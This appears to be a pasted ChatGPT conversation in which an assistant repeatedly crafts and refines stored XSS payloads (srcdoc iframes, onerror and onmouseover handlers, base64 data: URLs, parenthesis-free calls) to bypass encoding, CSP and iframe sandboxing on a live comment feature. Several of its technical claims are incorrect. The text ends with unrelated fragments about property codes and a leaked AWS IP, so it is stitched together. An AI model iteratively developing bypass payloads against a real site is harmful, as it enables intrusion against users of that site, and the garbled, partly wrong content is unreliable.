You said:
I tried this payload 

![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;iframe src=javascript:alert(document.domain) onerror=confirm("1")&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)

and output was :
"![video](';\"/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe src=javascript:prompt(document.domain)&amp;gt;&amp;lt;/iframe&amp;gt;)\r\n\r\n![video](';\"/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=\"&amp;lt;iframe src=javascript:alert(document.domain) onerror=confirm(\"1\")&amp;gt;\"&amp;gt;&amp;lt;/iframe&amp;gt;)\r\n\r\n![video](';\"/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=\"&amp;lt;img src=x onerror=confirm%28%31%29&amp;gt;\"&amp;gt;&amp;lt;/iframe&amp;gt;)"

and when visited the page the <iframe src=javascript:alert(document.domain this part was in black text and little small then normal text

you can see the code I took from inspect element 
<iframe src=".."&gt;&lt;textarea&gt;&lt;iframe srcdoc="&lt;iframe src='javascript:alert(document.domain)' class='w-full h-full' frameborder='0' allowfullscreen loading='lazy' sandbox='allow-scripts allow-same-origin allow-presentation allow-popups allow-popups-to-escape-sandbox'"></iframe></textarea>&lt;/iframe>

Analysis of XSS Exploit Attempt
From your provided payloads and responses, it seems the application has the following security mechanisms in place:

Content Security Policy (CSP) Restrictions:

The CSP is restricting frame-src to only certain whitelisted domains, which prevents your <iframe>-based payloads from loading external sources like javascript: URLs.
script-src-attr 'none' prevents inline JavaScript execution within event attributes like onerror.
Sandboxing of iframes:

The sandbox attribute includes allow-scripts and allow-same-origin, meaning scripts can execute, but they are confined within the same origin, preventing certain escape scenarios.
The presence of allow-scripts but without allow-modals prevents JavaScript-based alerts from showing.
Encoding Issues in Your Payloads:

The application might be filtering or escaping dangerous characters like <, >, and ", converting them into HTML entities like &lt;, &gt;, and &quot;, preventing execution.
JavaScript URI Scheme Blocked:

Your attempt to use javascript:alert(document.domain) in an iframe src was treated as plain text instead of executing. This suggests that javascript: URLs are either sanitized or explicitly blocked by CSP.
Finding a Working Payload
Given these restrictions, we need to find a bypass. Possible approaches:

Bypass CSP via Trusted Sources:

Since frame-src allows embedding content from specific sources (Google, YouTube, Rumble, Twitter), we could explore XSS payloads that execute within those trusted sources.
Example: If a trusted domain has an XSS vulnerability, you can iframe it and use postMessage to interact with it.
Use onfocus, onmouseover, or onmouseenter Events:

Some CSP policies block inline scripts but may not block event attributes on certain elements.
Example payload:
html
Copy
<input type="text" value="XSS" onfocus="alert(document.domain)">
Try embedding it within a known srcdoc or a div element that gets auto-focused.
Try a Mutation-based XSS (DOM Clobbering):

If the application is dynamically inserting your input into an element with innerHTML, you might be able to break out of existing HTML structure and inject scripts.
Example payload:
html
Copy

Alternative:
html
Copy
<a href="#" onclick="alert(1)">Click</a>
Find a Trusted JavaScript Execution Path:

If the site uses JavaScript frameworks like React, Angular, or Vue, check if there are places where user input is being rendered in a way that could lead to XSS (e.g., React dangerouslySetInnerHTML).
Use External Redirects or Open Redirects:

If there are any open redirect vulnerabilities in whitelisted frame-src domains, you can redirect to an XSS payload hosted on a trusted origin.
Recommended Next Steps:
Check if event handlers (onfocus, onmouseenter, etc.) execute in specific elements.
Test if a different CSP header applies to specific subpages.
Try srcdoc with trusted inline scripts that may be allowed.
Look for JavaScript libraries being loaded from external sources that might be vulnerable.
Would you like me to generate some custom payloads based on these findings? 🚀

You said:
maybe you forgot to encode as I showed you
ChatGPT said:
Got it! Let's properly encode new payloads based on your previous attempts and ensure they bypass the given restrictions. I'll generate encoded versions of potential payloads for you to test.

Encoded XSS Payloads
Here are a few variants of potential payloads, properly encoded in a similar way to what you used:

1. Encoded iframe Injection with srcdoc
html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Purpose: Attempts to execute an alert(document.domain) via an onerror event inside an iframe srcdoc.
Possible Bypass: Some CSP implementations may allow srcdoc execution.
2. Encoded onfocus XSS Attempt
html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;input type=text value=test onfocus=alert(document.domain)&amp;gt;)
Purpose: If an input field gets auto-focused, it triggers alert(document.domain).
Possible Bypass: Some event handlers (like onfocus) may not be explicitly blocked in CSP.
3. Encoded SVG Injection (Less Commonly Filtered)
html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;svg onload=alert(document.domain)&amp;gt;&amp;lt;/svg&amp;gt;)
Purpose: Uses an onload event in an SVG element to trigger an alert.
Possible Bypass: Some filtering mechanisms fail to block SVG elements.
4. Encoded Anchor Tag with onclick
html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;a href=# onclick=alert(document.domain)&amp;gt;Click Me&amp;lt;/a&amp;gt;)
Purpose: Injects an anchor (<a>) tag that executes an onclick event when clicked.
Possible Bypass: Some CSP policies block inline script-src, but onclick attributes might still work.
5. Encoded JavaScript Execution via setTimeout (If allowed)
html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;setTimeout(`alert(document.domain)`,1000);&amp;lt;/script&amp;gt;)
Purpose: Attempts to delay execution by 1 second, sometimes bypassing instant filters.
Possible Bypass: If inline scripts aren’t fully blocked, setTimeout might work.
Testing Instructions
Try each payload in the web app where you were testing.
Observe if any encoded payload gets stored and executed in an unintended way.
If nothing executes, look for differences in how the app encodes/filters the output.
Would you like a more customized approach based on additional response behaviors from the target app? 🚀

Do a very deep scan and review and analysis then response 
ChatGPT said:
I've reviewed the screenshots and the response from the server. Based on the evidence, here’s my detailed deep analysis and potential exploit path:

Analysis of the Behavior
Payload Reflection & Encoding:

Your payload is being stored and reflected on the page.
However, it is not executing as intended and instead appearing as plain text.
The key part of your payload <img src=x onerror=alert(document.domain)> is being displayed as text in black, meaning:
It is not being executed by the browser.
It is being partially sanitized or misinterpreted as plain text.
HTML Structure Analysis:

The inspect element screenshot reveals that the input is being placed inside an <iframe srcdoc>, which is:
Not directly executing JavaScript (due to sandbox restrictions).
Rendering the HTML inside but keeping scripts disabled due to CSP & iframe security rules.
The payload structure within iframe srcdoc:
html
Copy
<iframe srcdoc="&lt;img src=x onerror=alert(document.domain)&gt;"></iframe>
This means your XSS payload is inserted inside the srcdoc attribute.
However, since the iframe has a sandbox attribute, JavaScript execution is likely disabled.
CSP & Sandbox Restrictions:

The <iframe> has sandbox="allow-scripts allow-same-origin allow-presentation allow-popups allow-popups-to-escape-sandbox":
allow-scripts → Allows scripts inside, but...
allow-same-origin → Prevents execution unless explicitly whitelisted.
Missing allow-modals → Prevents alert() and confirm().
allow-popups-to-escape-sandbox → Potential for new tab-based payloads.
How the Payload is Being Rendered:

The browser treats iframe srcdoc as a separate HTML document.
The <img> tag is being rendered inside the iframe’s srcdoc context.
The payload does not escape the srcdoc sandbox, meaning it is isolated.
Exploitation Strategy:
Now, let’s bypass the sandbox restrictions and find a working payload.

1. Bypassing sandbox with Window References
Since allow-popups-to-escape-sandbox is enabled, try:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;window.open('javascript:alert(document.domain)')&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? This should open a new window and execute JavaScript outside the iframe sandbox.
2. Triggering a Click-Based Event
If CSP allows onclick, try:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;a href=javascript:alert(document.domain)&gt;CLICK&lt;/a&gt;"&gt;&lt;/iframe&gt;)
Why? If users manually click, the JavaScript executes outside the sandbox.
3. Using postMessage to Escape the Sandbox
If the main page listens for messages:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;parent.postMessage('XSS','*')&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? If the main site has a listener, it might execute commands outside of the iframe.
4. Attempting Inline Script Execution via Unicode Encoding
Some filters allow Unicode-encoded payloads:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(document.domain)&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? Bypasses naive script filtering.
Next Steps
Try each of these step by step.
Inspect element after each attempt to see how it renders.
Test if postMessage is being used (it could be an easy way to escape the iframe sandbox).
If none work, check if any whitelisted domains in frame-src allow JavaScript execution (possible CSP bypass via an open redirect).

Deep Analysis of the XSS Attempt and Why It’s Not Executing
Based on your screenshots and Burp Suite response, I’ve done a very detailed analysis of what’s happening. Here's my breakdown:

Observations from Your Evidence
Your Injected Payload

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;img src=x onerror=alert(document.domain)&gt;"&gt;&lt;/iframe&gt;)
You are injecting an iframe inside the video embedding field.
The iframe uses srcdoc to include an <img> with an onerror=alert(document.domain) payload.
Burp Response

json
Copy
{"message":"Comment created successfully","comment":
{"id":21250,"username":"tomarakkol",
"content":"![video](';\"/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=\"&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;\"&amp;gt;&amp;lt;/iframe&amp;gt;)",
"created_at":"2025-03-17T09:15:40.181Z","post_url_id":"24f93c8a0fb19664ce50b9c9d3659ec7"}}
Your payload is successfully stored in the database and not getting removed (which is good!).
However, it appears to be getting escaped when rendered.
Rendered Output on the Page (From Screenshot)

The <img src=x onerror=alert(document.domain) part is black text, meaning:
It was not interpreted as an HTML tag.
The srcdoc attribute inside the <iframe> is being sanitized or escaped.
Inspect Element Screenshot

html
Copy
<iframe srcdoc="&lt;img src=x onerror=alert(document.domain)&gt;" class="w-full h-full" frameborder="0"
allowfullscreen loading="lazy" sandbox="allow-scripts allow-same-origin allow-presentation allow-popups allow-popups-to-escape-sandbox">
The iframe is successfully injecting your content.
But HTML entities are still encoded (&lt; instead of <), meaning:
The browser treats it as plain text rather than executable HTML.
Why Isn't XSS Executing?
Your <iframe srcdoc> Payload Is Being Encoded

&lt;img src=x onerror=alert(document.domain)&gt; is not being converted back to real HTML.
The browser is rendering the iframe as-is and displaying the payload as text inside the iframe, instead of parsing it as an HTML document.
Possible Explanation for This Encoding

The website might be encoding dangerous characters before storing or rendering.
srcdoc content is not being interpreted as raw HTML; instead, it’s shown as text.
iframe sandbox Is Restricting Execution

The sandbox attribute includes:
html
Copy
sandbox="allow-scripts allow-same-origin allow-presentation allow-popups allow-popups-to-escape-sandbox"
Missing allow-modals → alert() and confirm() may be blocked.
Scripts inside srcdoc are restricted unless allow-same-origin allows full execution.
Potential Exploitation Paths
To bypass the encoding/sandboxing issue, let's try some techniques:

1. Breaking Out of iframe srcdoc Context
If the content inside srcdoc is being encoded, we might be able to break out of it using an "</iframe> injection:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;/iframe&gt;&lt;img src=x onerror=alert(document.domain)&gt;)
Why? This closes the existing iframe and injects raw HTML outside of it.
Expected Result: If the application fails to encode properly, the <img> tag will execute outside the iframe.
2. Encoding XSS Payload in Base64
If iframe srcdoc is encoding our payload, we can try Base64 encoding to hide the payload:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+" allow="script"&gt;&lt;/iframe&gt;)
Why? Base64 payloads are not easily sanitized.
Expected Result: Decodes into:
html
Copy
<script>alert(document.domain)</script>
3. Triggering JavaScript Outside the iframe
If JavaScript execution inside iframe srcdoc is blocked, let's execute it in the parent window:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;parent.postMessage('XSS','*')&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? If the main page listens for postMessage, it might execute the script outside the sandbox.
4. Checking for Auto-Linking XSS
Sometimes, applications automatically turn URLs into clickable links. Try this:

html
Copy
![video](javascript:alert(document.domain))
Why? If the app converts ![video](url) into <a href="url">, it could execute JavaScript when clicked.
Next Steps
Try the breaking "</iframe> method first—it might escape the encoding issue.
Check if Base64 works (inspect the rendered page to see if it decodes).
Test postMessage to see if the main site executes messages from the iframe.
Try javascript: inside ![video](...) to check for automatic linking.

and 

browser render and response let me explain you: screenshot attached please match my words with screenshot for better understanding 
this text was black and little smaller than normal text: <iframe src=javascript:confirm(document.domain
I have marke selected the black text taht you can understand 


and rest part of payload was below the Iframe 
this part was below the iframe :
)&gt;"&gt;&lt;/iframe&gt;)


maybe becasuse of this saparation I am not getting xss, if it would render together in black maybe we could get xss, I dont know you will understand better after seeing every POC output value.

I also gave you inspect element code screenshot of this part where reflecting the input payloads for better scan

please deeply analysis them and find a solution or bypass. 

ChatGPT said:
Deep Analysis of Your XSS Attempt and Why It’s Failing
I carefully analyzed your screenshots, Burp response, and page rendering behavior. Based on what I see, here’s a breakdown of what’s happening and how we can bypass the restrictions.

Issue Breakdown:
Your Injected Payload:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;iframe src=javascript:confirm(document.domain)&gt;"&gt;&lt;/iframe&gt;)
You attempted to use an inner iframe with src=javascript:.
Expected behavior: The inner iframe should execute JavaScript.
Actual behavior: The text <iframe src=javascript:confirm(document.domain is displayed in black text, meaning:
It is being rendered as plain text instead of being interpreted as an HTML tag.
Burp Response Shows Encoding:

json
Copy
"content":"![video](';\"/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=\"&amp;lt;iframe src=javascript:confirm(document.domain))&amp;gt;\"&amp;gt;&amp;lt;/iframe&amp;gt;)",
Key issue: &lt; and &gt; remain encoded inside srcdoc, meaning the browser treats it as text, not executable HTML.
Rendered Page Behavior:

The <iframe src=javascript:confirm(document.domain part appears in black and is not executing.
Rest of the payload appears below the iframe, meaning:
The browser interprets it as separate broken text instead of a complete iframe.
Inspect Element Shows Incorrect Tag Structure:

html
Copy
<iframe srcdoc="&lt;iframe src=javascript:confirm(document.domain)&gt;">
Since it remains HTML-encoded, it is not being interpreted as an actual <iframe>.
The browser does not execute javascript: URLs inside iframe src due to CSP restrictions.
Why Isn’t XSS Working?
HTML Encoding Is Preventing Interpretation

Your input is being sanitized, preventing iframe src from executing as a real element.
&lt; and &gt; are not being converted back into < >.
`iframe src="javascript:" is Blocked by Modern Browsers

Most modern browsers block iframe src=javascript: for security reasons.
Even if it were correctly injected, the browser wouldn't execute the JavaScript inside the iframe.
Broken Injection Prevents Proper Execution

The browser renders part of your payload as text instead of an actual iframe.
The separation means even if encoding was bypassed, it still wouldn't execute.
Possible Bypasses:
1. Try Breaking Out of iframe srcdoc
Since srcdoc is not being interpreted correctly, let's break out:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;/iframe&gt;&lt;img src=x onerror=alert(document.domain)&gt;)
Why? This closes the existing iframe, forcing the browser to interpret raw HTML.
Expected Result: If successful, it will render <img> properly and trigger onerror.
2. Use data: URL Instead of javascript:
Since iframe src=javascript: is blocked, we can try a data: URL:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+' &gt;"&gt;&lt;/iframe&gt;)
Why? This decodes into:
html
Copy
<script>alert(document.domain)</script>
Expected Result: If data: URLs are allowed, the script will execute inside the iframe.
3. Use Click-Based XSS
If automatic execution isn’t working, force a user action:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;a href=javascript:alert(document.domain)&gt;CLICK ME&lt;/a&gt;"&gt;&lt;/iframe&gt;)
Why? If users click the link, JavaScript executes outside of iframe sandbox.
4. Try postMessage() Bypass
If scripts inside iframe cannot execute alerts, we can send a message to the main window:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;parent.postMessage('XSS','*')&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? If the parent window listens for postMessage, it could execute our payload.
Next Steps
Try the "</iframe> break-out method first.
Check if data: URL execution is allowed (this is a high chance of success).
See if any JavaScript event-based execution (onclick) works.
Test postMessage() to see if the main site listens for iframe messages.

still didnt work 

lets supppose this is the paylaod 

![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;iframe src=javascript:confirm(document.domain&#41;)&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)

is there any way that server cannot split the payload or even server split the paylaod still the xss will trigger ? you know where the payload got split, also there is an option to use payload in a way tthat we can use confim"document.domain" or something like that without using the ()
work on it which will be more effective 
make sure to encode them aswell

Objective: Prevent Payload Splitting and Execute XSS
Since your payload is being split by the server during rendering, we need a way to prevent splitting or ensure that even if the payload gets split, XSS still executes.

Key Problems Identified:
Payload Splitting:

Your iframe payload is being broken into two parts, which prevents execution.
The part <iframe src=javascript:confirm(document.domain appears in black text.
The ) and "> appear outside the iframe, meaning the browser doesn’t treat it as a valid iframe src execution.
Blocked iframe src="javascript:" Execution:

Modern browsers block iframe src=javascript: due to security restrictions.
Even if it were not split, the browser would likely refuse execution.
Using confirm(document.domain) Without ()

We need to execute JavaScript without using parentheses (()), so that even if the payload is split, it might still work.
Solutions to Prevent Splitting and Ensure Execution
1. Prevent Payload Splitting Using Encoded Characters
To prevent the server from breaking our payload, we use encoded versions of critical symbols:

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;iframe src=javascript:confirm&quot;&amp;gt;document.domain&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Why? This structure moves document.domain outside of parentheses.
Expected Behavior: If the server only splits at (), this should execute confirm "document.domain".
2. Alternative: Prevent Splitting with Quotation Manipulation
If the server splits at certain characters, we can force execution without breaking syntax:

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;iframe src=javascript:confirm&quot;document.domain&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Why? The server won’t break inside a quoted string.
Expected Result: If confirm"document.domain" is executed without (), it might still show an alert.
3. Force Execution Using eval() Instead of confirm()
If confirm(document.domain) is being blocked or broken, use eval():

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;eval`alert'document.domain'`&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Why? eval does not require parentheses (()).
Expected Behavior: If the server splits before execution, eval can still run.
4. Bypassing () Restriction Using setTimeout
If parentheses are breaking execution, we use setTimeout:

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;setTimeout`alert'document.domain'`&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Why? Even if the server injects spaces or breaks the text, setTimeout still works.
Expected Behavior: Triggers XSS even if () is stripped or broken.
5. Test with onerror to Trigger Even If Split
To execute XSS even if the payload is broken, we use onerror:

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;img src=x onerror=alert`document.domain`&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
Why? onerror does not require a valid function call.
Expected Behavior: If the server breaks the payload but renders an image, it still executes XSS.
Recommended Execution Order
Test Preventing Splitting with Encoded Payloads (confirm"document.domain")
Try Execution Without () Using eval(), setTimeout
Use onerror to Ensure Execution Even If Split
Check If the Browser Allows iframe src="data:text/html;base64,...

I tried this payload: 

![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;setTimeoutalert'document.domain'&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)

now it printed the payload <script>setTimeoutalert'document.domain'</script>
check screenshot : 

Now I got it why it was splitting 

if we focus over parameter with payload

![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;iframe src=javascript:confirm(document.domain&#41;)&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)

on the request body

the template is

 ![video](it's_the_place_for_video_link) but we gave payload instead
 ![video]()

so when we provided 
so when we give payload inside the ![video](here) when ")" it comes inside the payload it think it's the video link end. so it took it into the frame and show it as black text and rest payload part send below the frame as normal text. 

I hope you got it

so is there any chance to get xss ? deeply analyse and let me know the solution
ChatGPT said:
Deep Analysis and Solution for XSS Execution
I fully understand the issue now. The problem occurs because the application interprets ) inside the ![video](payload) syntax as the closing bracket of the link. This causes:

Payload Splitting – The part before ) is taken as a valid link (rendered as a black text).
Remaining Payload as Plain Text – The rest of the payload is placed below the iframe, preventing execution.
Now, let’s find a working bypass to trigger XSS despite these limitations.

🛠 Possible Solutions to Ensure XSS Execution
1️⃣ Encapsulate Payload to Prevent Splitting
Fixing the ) Issue with URL Encoding
If ) is causing the payload to split, we encode it as %29:

html
Copy
![video](&#039;;&quot;/&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;setTimeout`alert%29document.domain%29`&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;)
🔹 Why? This prevents the app from prematurely closing the video URL by treating %29 as part of the script.

2️⃣ Force the Payload to Stay Within the iframe srcdoc
Since ) is breaking the input, we avoid it completely and execute JavaScript differently:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;eval`alert'document.domain'`&lt;/script&gt;"&gt;&lt;/iframe&gt;)
🔹 Why? eval\alert'document.domain'`executesalert(document.domain)` without using parentheses.

3️⃣ Using onerror Instead of (), Since It Doesn’t Require Function Calls
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;img src=x onerror=alert`document.domain`&gt;"&gt;&lt;/iframe&gt;)
🔹 Why? onerror will execute JavaScript automatically if img src=x fails to load.

4️⃣ Trigger Execution with an Event (onmouseover)
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;a href=# onmouseover=alert`document.domain`&gt;Hover Me&lt;/a&gt;"&gt;&lt;/iframe&gt;)
🔹 Why? The script executes when a user hovers over the link, bypassing execution restrictions.

5️⃣ Using data: URL Instead of JavaScript
If the application blocks javascript:, try a Base64-encoded HTML page in data: URL:

html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+" &gt;&lt;/iframe&gt;)
🔹 Why? Decodes into:

html
Copy
<script>alert(document.domain)</script>
Expected Result: If data: URLs are allowed, JavaScript executes inside the iframe.

📌 Recommended Execution Order
1️⃣ Try URL Encoding Fix First (%29) – This should prevent splitting.
2️⃣ Use eval() Without () – Some filters may block normal function calls but allow template literals.
3️⃣ Test onerror and onmouseover – These trigger without ().
4️⃣ Check for data: URL Execution – If iframe src=data:text/html,... is allowed, it will execute.

🚀 Final Thoughts
The main issue was ) breaking the payload, so encoding it or removing function calls (()) ensures XSS triggers.
If iframe is still sandboxed, try breaking out with an event trigger (onerror, onmouseover).
Would you like an automated script to test all payloads at once? 🚀

ChatGPT said:
Deep Analysis: Why XSS is Not Triggering & Next Steps
I have carefully analyzed the screenshots, your payload, and the output behavior. Here's why the XSS didn't execute and how we can bypass it.

🛑 Why Did the XSS Fail?
1️⃣ The <script> Tag is Being Printed as Plain Text
Your payload:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;setTimeout`alert%29document.domain%29`&lt;/script&gt;"&gt;&lt;/iframe&gt;)
What Happened?
Instead of executing, the browser displayed the <script> tag as plain text.
This means the iframe srcdoc content is still being encoded or sanitized before rendering.
2️⃣ Encoded Characters Not Being Decoded
The %29 (which is the encoded )) was not converted back into ).
Since it remained encoded, JavaScript didn’t interpret alert%29document.domain%29 as alert(document.domain).
3️⃣ The iframe srcdoc Context is Enforcing Sandboxing
The iframe has sandbox attributes, preventing direct script execution.
Inspect element confirms that allow-scripts is present, but may still restrict execution due to CSP.
🚀 Working Bypass Strategies
Now, let's try better techniques to get XSS execution.

✅ 1️⃣ Force Raw HTML Parsing by Breaking Out of iframe srcdoc
The main problem is that iframe srcdoc is encoding content instead of interpreting it as HTML.
Try breaking out of iframe srcdoc using </iframe> injection:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;/iframe&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;)
Why? This closes the existing iframe early and injects a raw script.
Expected Behavior: If HTML parsing happens correctly, the script executes outside iframe.
✅ 2️⃣ Use onerror Instead of <script>
Since <script> is being printed as plain text, let's use an event-based trigger:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;img src=x onerror=alert(document.domain)&gt;"&gt;&lt;/iframe&gt;)
Why? onerror executes without requiring <script>.
Expected Behavior: If the browser allows onerror, XSS will trigger.
✅ 3️⃣ Use an onmouseover Event Inside the iframe
If JavaScript cannot auto-execute, force a user action:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;a href=# onmouseover=alert(document.domain)&gt;Hover Me&lt;/a&gt;"&gt;&lt;/iframe&gt;)
Why? The script executes when a user hovers over the link.
Expected Behavior: This works if script execution is restricted but event-based XSS is possible.
✅ 4️⃣ Use data: URL for JavaScript Execution
Some CSP restrictions block javascript: but allow data:text/html.
Try encoding JavaScript in Base64 inside a data: URL:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+" &gt;&lt;/iframe&gt;)
Why? Decodes into:
html
Copy
<script>alert(document.domain)</script>
Expected Behavior: If iframe src=data: URLs are allowed, JavaScript executes inside the iframe.
✅ 5️⃣ Use postMessage to Escape the Sandbox
If sandbox is blocking execution, try sending a message to the main window:
html
Copy
![video](';"/>&lt;/textarea&gt;&lt;iframe srcdoc="&lt;script&gt;parent.postMessage('XSS','*')&lt;/script&gt;"&gt;&lt;/iframe&gt;)
Why? If the parent page listens for postMessage, it might execute the payload in the main document.
Expected Behavior: If the site has an event listener, XSS triggers.
📌 Recommended Execution Order
1️⃣ Try "</iframe> injection first to break out of iframe srcdoc.
2️⃣ Use onerror for automatic execution if <script> fails.
3️⃣ Check if onmouseover triggers execution via user interaction.
4️⃣ Test data: URL execution inside iframe.
5️⃣ Use postMessage() if sandbox is restricting execution.

🚀 Conclusion
The main problem was iframe srcdoc rendering as text instead of executing JavaScript.
Fixing the encoding issue and breaking out of iframe are the best solutions.
Using event-based triggers (onerror, onmouseover) or data: URLs increases the chances of success.
Would you like automated testing scripts to check all these bypasses quickly? 🚀

ChatGPT said:
The IPC number you're referring to is most likely the International Property Code used to uniquely identify real estate properties or locations. However, these property identification systems may vary by country, and there isn't a standardized system like a global "IPC number" for every property. But, different regions or organizations may use their own systems to classify or track properties.

Here are some examples of different property identification systems you might come across:

1. Cadastral Code (Used in Some Countries)
Example: 123-456-7890
A unique identifier used in land registration systems in countries like New Zealand or Australia.
2. NZ Property Address Code (New Zealand)
Example: 123-456-789
New Zealand property addresses may be identified using cadastral or land identification numbers.
3. Tax Parcel Number (United States)
Example: 15-112-345-678
A code used to identify properties for taxation purposes in the U.S. This includes details like location and type of property.
4. Land Lot Number
Example: L/13/45
A lot number used to identify a particular parcel of land in some land registries.
If you're looking for a specific IPC code for a property, I would recommend checking the local government or property registration authority in New Zealand, such as Land Information New Zealand (LINZ), as they will have property identification numbers for land, real estate, and buildings.

Would you like me to help you find the property registration details for this specific address in New Zealand?

Understanding Your Finding:
You've encountered an IP address during your bug bounty hunt with a FOFA search (similar to Shodan), and you've identified the following details for soj.ooo:

IP Address: 52.60.87.163
Cloud Provider: Amazon Web Services (AWS)
Country: Canada / Quebec / Montreal
ASN: 16509 (Amazon's ASN)
Organization: AMAZON-02 (AWS Network)
Is This a Vulnerability?
This is not necessarily a vulnerability, but rather information leakage that might be a concern. Let me explain why:

1. The IP Address Revealed:
AWS IP: The IP address 52.60.87.163 belongs to Amazon Web Services (AWS), which means it is publicly routable and is likely associated with a service running in AWS (such as EC2, S3, etc.).

Internal IP Leakage?

AWS Public IPs are generally not internal IP addresses, but public IP addresses assigned to AWS services.
There could be a concern if this specific IP address is supposed to be internal (for example, part of a VPC or a private network) and it was mistakenly exposed publicly.
2. "Future home of soj.ooo":
This might be a placeholder or a future service that the soj.ooo domain plans to launch.

It’s not unusual for a website or application under development to temporarily point to an IP address where services are hosted (even though it’s in AWS, which is a public cloud).

If this IP address was not intended to be public, but you found it exposed due to the use of Shodan/FOFA, this could be a misconfiguration in the deployment or DNS setup.

Possible Risks of Information Leakage:
While this isn't necessarily an immediate vulnerability in terms of an exploit, there are some concerns:

Unintended Exposure:

If the IP address is associated with internal resources that should not be public (for example, a private management API or test environment), its exposure could be a misconfiguration and potentially lead to future security risks.
Reconnaissance for Attackers:

Attackers could use this information to map out the infrastructure and potentially find weak points to target (for example, open ports or unprotected services running on that IP).
